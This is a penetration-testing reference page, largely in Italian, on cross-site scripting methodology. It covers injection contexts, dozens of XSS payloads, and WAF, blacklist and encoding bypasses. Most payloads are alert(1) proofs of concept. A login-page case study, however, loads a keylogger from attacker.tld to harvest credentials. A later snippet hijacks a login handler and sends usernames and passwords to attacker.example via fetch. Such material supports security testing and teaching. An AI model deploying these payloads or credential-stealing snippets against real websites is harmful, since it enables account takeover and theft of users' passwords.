# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Verifica se **qualunque valore che controlli** (_parameters_, _path_, _headers_?, _cookies_?) è **riflesso** nell'HTML o **usato** dal codice **JS**.
2. **Trova il contesto** in cui è riflesso/usato.
3. Se **riflesso**
1. Verifica **quali simboli puoi usare** e, a seconda di quelli, prepara il payload:
1. In **raw HTML**:
1. Puoi creare nuovi tag HTML?
2. Puoi usare eventi o attributi che supportano il protocollo `javascript:`?
3. Puoi bypassare le protezioni?
4. Il contenuto HTML è interpretato da qualche motore JS client-side (_AngularJS_, _VueJS_, _Mavo_...)? Potresti abusare di una [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Se non puoi creare tag HTML che eseguono JS, puoi abusare di una [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. All'interno di un **tag HTML**:
1. Puoi uscire al contesto raw HTML?
2. Puoi creare nuovi eventi/attributi per eseguire codice JS?
3. L'attributo in cui sei intrappolato supporta l'esecuzione di JS?
4. Puoi bypassare le protezioni?
3. All'interno del **codice JavaScript**:
1. Puoi uscire dal tag `<script>`?
2. Riesci a uscire dalla stringa e a eseguire codice JS diverso?
3. Il tuo input è in template literals ``?
4. Puoi bypassare le protezioni?
4. Funzione Javascript che viene **eseguita**
1. Puoi indicare il nome della funzione da eseguire. es.: `?callback=alert(1)`
4. If **used**:
1. Potresti sfruttare una **DOM XSS**, presta attenzione a come il tuo input è controllato e se il tuo **input controllato è usato da qualche sink.**

When working on a complex XSS you might find interesting to know about:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

Per sfruttare con successo una XSS la prima cosa da trovare è un **valore controllato da te che viene riflesso** nella pagina web.

- **Intermediately reflected**: Se trovi che il valore di un parameter o anche del path viene riflesso nella pagina web potresti sfruttare una **Reflected XSS**.
- **Stored and reflected**: Se trovi che un valore controllato da te viene salvato sul server e viene riflesso ogni volta che accedi a una pagina, potresti sfruttare una **Stored XSS**.
- **Accessed via JS**: Se trovi che un valore controllato da te viene letto tramite JS puoi sfruttare una **DOM XSS**.

## Contesti

Quando provi a sfruttare una XSS la prima cosa da sapere è **dove viene riflesso il tuo input**. A seconda del contesto, potrai eseguire codice JS arbitrario in modi differenti.

### Raw HTML

Se il tuo input è **riflesso nel raw HTML** della pagina dovrai sfruttare qualche **tag HTML** per eseguire codice JS: `<img , <iframe , <svg , <script` ... questi sono solo alcuni dei tanti tag HTML che potresti usare.\
Inoltre, tieni presente [Client Side Template Injection](../client-side-template-injection-csti.md).

### Inside HTML tags attribute

Se il tuo input è riflesso all'interno del valore di un attributo di un tag puoi provare:

1. Per **uscire dall'attributo e dal tag** (poi sarai nel raw HTML) e creare un nuovo tag HTML da sfruttare: `"><img [...]`
2. Se **riesci a uscire dall'attributo ma non dal tag** (`>` è codificato o rimosso), a seconda del tag potresti **creare un evento** che esegue codice JS: `" autofocus onfocus=alert(1) x="`
3. Se **non puoi uscire dall'attributo** (`"` viene codificato o rimosso), allora a seconda di **in quale attributo** il tuo valore è riflesso e se **controlli tutto il valore o solo una parte**, potrai abusarne. Per **esempio**, se controlli un handler come `onclick=` potrai farlo eseguire codice arbitrario al click. Un altro **esempio** interessante è l'attributo `href`, dove puoi usare il protocollo `javascript:` per eseguire codice arbitrario: **`href="javascript:alert(1)"`**
4. Se il tuo input è riflesso all'interno di **unexpoitable tags** potresti provare il trucco **`accesskey`** per sfruttare la vuln (avrai bisogno di social engineering per sfruttarlo): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

A corporate SSO login page reflected the OAuth `service` parameter inside the `href` attribute of `<a id="forgot_btn" ...>`. Even though `<` and `>` were HTML-encoded, double quotes were not, so the attacker could close the attribute and reuse the same element to inject handlers such as `" onfocus="payload" x="`.

1. **Inject the handler:** Simple payloads like `onclick="print(1)"` were blocked, but the WAF only inspected the first JavaScript statement in inline attributes. Prefixing a harmless expression wrapped in parentheses, then a semicolon, allowed the real payload to execute: `onfocus="(history.length);malicious_code_here"`.
2. **Auto-trigger it:** Browsers focus any element whose `id` matches the fragment, so appending `#forgot_btn` to the exploit URL forces the anchor to focus on page load and runs the handler without requiring a click.
3. **Keep the inline stub tiny:** The target already shipped jQuery. The handler only needed to bootstrap a request via `$.getScript(...)` while the full keylogger lived on the attacker's server.

**Building strings without quotes**

Le virgolette singole venivano restituite URL-encoded e le virgolette doppie escaped corrompevano l'attributo, quindi il payload generava ogni stringa con `String.fromCharCode`. Una funzione helper rende facile convertire qualsiasi URL in char codes prima di incollarlo nell'attributo:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Un attributo risultante appariva così:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Perché questo ruba credenziali**

Lo script esterno (caricato da un attacker-controlled host o da Burp Collaborator) agganciava `document.onkeypress`, bufferizzava le keystrokes e, ogni secondo, eseguiva `new Image().src = collaborator_url + keys`. Poiché l'XSS si attiva solo per utenti non autenticati, l'azione sensibile è il login form stesso — l'attacker acquisisce tramite keylogging usernames e passwords anche se la vittima non preme mai "Login".

Strano esempio di Angular che esegue XSS se controlli il nome di una classe:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### All'interno del codice JavaScript

In questo caso il tuo input viene riflesso tra i tag **`<script> [...] </script>`** di una pagina HTML, all'interno di un file `.js` o in un attributo che usa il protocollo **`javascript:`**:

- Se viene riflesso tra **`<script> [...] </script>`** tag, anche se il tuo input è racchiuso in qualsiasi tipo di virgolette, puoi provare a iniettare `</script>` e uscire da questo contesto. Questo funziona perché il **browser prima parserà i tag HTML** e poi il contenuto, quindi non noterà che il tuo tag `</script>` iniettato è dentro il codice HTML.
- Se viene riflesso **all'interno di una stringa JS** e l'ultimo trucco non funziona dovrai **uscire** dalla stringa, **eseguire** il tuo codice e **ricostruire** il codice JS (se c'è qualche errore, non verrà eseguito:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Se viene riflesso inside template literals puoi **embed JS expressions** usando la sintassi `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- La **codifica Unicode** funziona per scrivere **codice javascript valido**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting si riferisce alla possibilità di **dichiarare funzioni, variabili o classi dopo che vengono usate così da poter sfruttare scenari in cui una XSS sta usando variabili o funzioni non dichiarate.**\
**Controlla la seguente pagina per maggiori informazioni:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Diverse pagine web hanno endpoint che **accettano come parametro il nome della funzione da eseguire**. Un esempio comune visto nel mondo reale è qualcosa del tipo: `?callback=callbackFunc`.

Un buon modo per scoprire se qualcosa fornito direttamente dall'utente viene eseguito è **modificare il valore del parametro** (per esempio in 'Vulnerable') e controllare la console per errori come:

![](<../../images/image (711).png>)

Se è vulnerabile, potresti riuscire a **scatenare un alert** semplicemente inviando il valore: **`?callback=alert(1)`**. Tuttavia, è molto comune che questi endpoint **validino il contenuto** per permettere solo lettere, numeri, punti e underscore (**`[\w\._]`**).

Tuttavia, anche con quella limitazione è ancora possibile eseguire alcune azioni. Questo perché puoi usare quei caratteri validi per **accedere a qualsiasi elemento nel DOM**:

![](<../../images/image (747).png>)

Alcune funzioni utili per questo:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Puoi anche provare a **invocare funzioni Javascript** direttamente: `obj.sales.delOrders`.

Tuttavia, di solito gli endpoint che eseguono la funzione indicata sono endpoint con un DOM poco interessante; **altre pagine nella stessa origine** avranno un **DOM più interessante** per effettuare ulteriori azioni.

Pertanto, per **abusare di questa vulnerabilità in un DOM diverso** è stata sviluppata l'exploitazione **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Esiste **codice JS** che utilizza in modo **non sicuro** alcuni **dati controllati da un attaccante** come `location.href`. Un attaccante potrebbe abusarne per eseguire codice JS arbitrario.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Questi tipi di XSS possono essere trovati **ovunque**. Non dipendono solo dallo sfruttamento lato client di una web application ma da **qualsiasi** **contesto**. Questo tipo di **esecuzione arbitraria di JavaScript** può anche essere abusata per ottenere **RCE**, **leggere** **file** **arbitrari** su client e server, e altro.\
Alcuni **esempi**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Quando il tuo input viene riflesso **all'interno della pagina HTML** oppure puoi evadere e iniettare codice HTML in questo contesto, la **prima** cosa da fare è verificare se puoi abusare del carattere `<` per creare nuovi tag: prova semplicemente a **riflettere** quel **carattere** e controlla se viene **HTML encoded** o **cancellato** o se viene **riflesso senza modifiche**. **Solo nel caso finale potrai sfruttare questa situazione**.\
Per questi casi tieni inoltre **in considerazione** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Nota: Un commento HTML può essere chiuso usando\*\***\***\*`-->`\*\***\***\*o \*\***`--!>`\*\**_

In questo caso, e se non viene usato alcun black/whitelisting, puoi usare payloads come:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Tuttavia, se viene utilizzato un sistema di black/whitelisting per tags/attributes, dovrai eseguire un **brute-force per scoprire quali tags** puoi creare.\
Una volta **individuati i tags consentiti**, dovrai **brute-force attributes/events** all'interno dei tag validi trovati per vedere come puoi attaccare il contesto.

### Tags/Events brute-force

Vai su [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) e clicca su _**Copy tags to clipboard**_. Poi inviali tutti usando Burp intruder e verifica se qualche tag non è stato rilevato come malevolo dal WAF. Una volta scoperti quali tag puoi usare, puoi **brute force all the events** usando i tag validi (nella stessa pagina web clicca su _**Copy events to clipboard**_ e segui la stessa procedura di prima).

### Tag personalizzati

Se non trovi alcun tag HTML valido, puoi provare a **creare un tag personalizzato** ed eseguire codice JS con l'attributo `onfocus`. Nella richiesta XSS devi terminare l'URL con `#` per far sì che la pagina **metta il focus su quell'oggetto** e **esegua** il codice:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Bypass della blacklist

Se è in uso una blacklist, puoi provare a bypassarla con qualche trucchetto:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Ulteriori tiny XSS per diversi ambienti** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) and [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
L'ultimo utilizza 2 caratteri unicode che si espandono in 5: telsr\
Altri di questi caratteri si possono trovare [here](https://www.unicode.org/charts/normalization/).\
Per verificare in quali caratteri sono decomposti controlla [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Se, per sfruttare la vulnerabilità, hai bisogno che l'**utente clicchi un link o un form** con dati precompilati, puoi provare a [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (se la pagina è vulnerabile).

### Impossible - Dangling Markup

Se pensi che **sia impossibile creare un tag HTML con un attributo che esegua codice JS**, dovresti controllare [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)perché potresti **sfruttare** la vulnerabilità **senza** eseguire codice **JS**.

## Iniezione dentro un tag HTML

### All'interno del tag/escaping dal valore dell'attributo

Se ti trovi **inside a HTML tag**, la prima cosa che puoi provare è di **escape** dal tag e usare alcune delle tecniche menzionate nella [previous section](#injecting-inside-raw-html) per eseguire codice JS.\
Se **non puoi escape dal tag**, puoi creare nuovi attributi all'interno del tag per provare a eseguire codice JS, per esempio usando un payload come (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Eventi di stile**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### All'interno dell'attributo

Anche se **non puoi uscire dall'attributo** (`"` viene codificato o eliminato), a seconda di **quale attributo** contiene il tuo valore e **se controlli l'intero valore o solo una parte** potrai abusarne. Per **esempio**, se controlli un evento come `onclick=` potrai far eseguire codice arbitrario quando viene cliccato.\
Un altro interessante **esempio** è l'attributo `href`, dove puoi usare il protocollo `javascript:` per eseguire codice arbitrario: **`href="javascript:alert(1)"`**

**Bypass all'interno dell'evento usando HTML encoding/URL encode**

I **HTML encoded characters** all'interno del valore degli attributi dei tag HTML vengono **decodificati a runtime**. Pertanto qualcosa come il seguente sarà valido (il payload è in grassetto): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Nota che **qualsiasi tipo di HTML encode è valido**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Nota che anche URL encode funzionerà:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass all'interno dell'evento usando Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Protocolli speciali nell'attributo

Lì puoi usare i protocolli **`javascript:`** o **`data:`** in alcuni posti per **eseguire codice JS arbitrario**. Alcuni richiederanno l'interazione dell'utente, altri no.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Luoghi in cui puoi iniettare questi protocolli**

**In generale** il protocollo `javascript:` può essere **usato in qualsiasi tag che accetta l'attributo `href`** e nella **maggior parte** dei tag che accettano l'**attributo `src`** (ma non `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Altri trucchi di offuscamento**

_**In questo caso HTML encoding e Unicode encoding trick dalla sezione precedente sono anch'essi validi poiché sei all'interno di un attributo.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Inoltre, c'è un altro **bel trucco** per questi casi: **Anche se il tuo input all'interno di `javascript:...` viene URL encoded, verrà URL decoded prima della sua esecuzione.** Quindi, se hai bisogno di **uscire** dalla **stringa** usando un **apostrofo** e vedi che **viene URL encoded**, ricordati che **non importa,** verrà **interpretato** come un **apostrofo** durante il tempo di **esecuzione**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Nota che se provi a **usare entrambi** `URLencode + HTMLencode` in qualsiasi ordine per codificare il **payload** non **funzionerà**, ma puoi **mescolarli all'interno del payload**.

**Usare Hex e Octal encode con `javascript:`**

Puoi usare **Hex** e **Octal encode** all'interno dell'attributo `src` di `iframe` (almeno) per dichiarare **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Se puoi iniettare qualsiasi URL in un arbitrario tag **`<a href=`** che contiene gli attributi **`target="_blank" and rel="opener"`**, consulta la **pagina seguente per sfruttare questo comportamento**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Prima di tutto controlla questa pagina ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) per utili **"on" event handlers**.\
Se esiste qualche blacklist che ti impedisce di creare questi event handlers, puoi provare i seguenti bypass:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Unexploitable tags" (hidden input, link, canonical, meta)

Da [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **ora è possibile abusare degli hidden inputs con:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
E nei **meta tag**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Da [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Puoi eseguire un **XSS payload inside a hidden attribute**, purché tu riesca a **persuadere** la **victim** a premere la **combinazione di tasti**. Su Firefox Windows/Linux la combinazione di tasti è **ALT+SHIFT+X** e su OS X è **CTRL+ALT+X**. Puoi specificare una combinazione diversa usando un tasto diverso nell'**access key attribute**. Ecco il vettore:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Il payload XSS sarà qualcosa del genere: `" accesskey="x" onclick="alert(1)" x="`**

### Bypass della blacklist

Alcuni trucchi che utilizzano diverse codifiche sono già stati mostrati in questa sezione. Torna indietro per imparare dove puoi usare:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Leggi i[ Bypass della blacklist della sezione precedente](#blacklist-bypasses).

**Bypasses for JavaScript code**

Leggi la J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Se trovi una **XSS in una parte molto piccola** del sito che richiede qualche tipo di interazione (magari un piccolo link nel footer con un elemento onmouseover), puoi provare a **modificare lo spazio che quell'elemento occupa** per massimizzare le probabilità che il link venga attivato.

Per esempio, potresti aggiungere dello stile all'elemento come: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Ma, se il WAF sta filtrando l'attributo style, puoi usare CSS Styling Gadgets, quindi se trovi, per esempio

> .test {display:block; color: blue; width: 100%\}

e

> \#someid {top: 0; font-family: Tahoma;}

Ora puoi modificare il nostro link e portarlo alla forma

> \<a href="" id=someid class=test onclick=alert() a="">

Questo trucco è stato preso da [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Iniettare dentro il codice JavaScript

In questo caso il tuo **input** sarà **riflesso all'interno del codice JS** di un file `.js` o tra i tag `<script>...</script>` o tra eventi HTML che possono eseguire codice JS o in attributi che accettano il protocollo `javascript:`.

### Evadere il tag \<script>

Se il tuo codice è inserito all'interno di `<script> [...] var input = 'reflected data' [...] </script>` potresti facilmente **evadere la chiusura del tag `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Nota che in questo esempio **non abbiamo nemmeno chiuso l'apice singolo**. Questo perché **il parsing HTML viene eseguito prima dal browser**, il che comporta l'identificazione degli elementi della pagina, inclusi i blocchi di script. Il parsing di JavaScript per comprendere ed eseguire gli script incorporati viene eseguito solo in seguito.

### All'interno del codice JS

Se `<>` vengono sanitizzati puoi comunque **eseguire l'escape della stringa** dove il tuo input è **posizionato** ed **eseguire JS arbitrario**. È importante **correggere la sintassi JS**, perché se ci sono errori, il codice JS non verrà eseguito:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Quando l'input utente viene inserito dentro una stringa JavaScript quotata (ad es. echo lato server dentro uno script inline), puoi terminare la stringa, iniettare codice e riparare la sintassi affinché il parser continui a elaborare correttamente. Scheletro generico:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Esempio di modello di URL quando il parametro vulnerabile viene riflesso in una stringa JS:
```
?param=test";<INJECTION>;a="
```
Esegue attacker JS senza dover toccare il contesto HTML (pure JS-in-JS). Combinalo con blacklist bypasses qui sotto quando i filtri bloccano keywords.

### Template literals ``

Per costruire **strings**, oltre alle virgolette singole e doppie, JS accetta anche le **backticks** **` `` `**. Questo è noto come template literals poiché permettono di incorporare **embedded JS expressions** usando la sintassi `${ ... }`.\ Quindi, se trovi che il tuo input viene **reflected** all'interno di una JS string che usa backticks, puoi abusare della sintassi `${ ... }` per eseguire **arbitrary JS code**:

This can be **abused** using:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Encoded code execution
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Consegnabili payloads con eval(atob()) e sfumature di scope

Per mantenere gli URL più corti e bypassare filtri di keyword semplici, puoi codificare in base64 la tua logica reale e valutarla con `eval(atob('...'))`. Se un filtro di parole chiave semplice blocca identificatori come `alert`, `eval` o `atob`, usa identificatori escapati in Unicode che compilano identicamente nel browser ma evadono i filtri basati su stringhe:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Nota importante sullo scope: `const`/`let` dichiarati dentro `eval()` sono block-scoped e NON creano globals; non saranno accessibili agli script successivi. Usa un elemento `<script>` iniettato dinamicamente per definire hook globali non riassegnabili quando necessario (es. per hijackare un form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Riferimento: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Esecuzione JS codificata in Unicode
```javascript
alert(1)
alert(1)
alert(1)
```
### Tecniche JavaScript per bypass blacklists

**Stringhe**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Escape speciali**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Sostituzioni di spazi nel codice JS**
```javascript
<TAB>
/**/
```
**JavaScript comments (da** [**JavaScript Comments**](#javascript-comments) **trucco)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (dal** [**JavaScript new line**](#javascript-new-lines) **trucco)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**Spazi bianchi in JavaScript**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
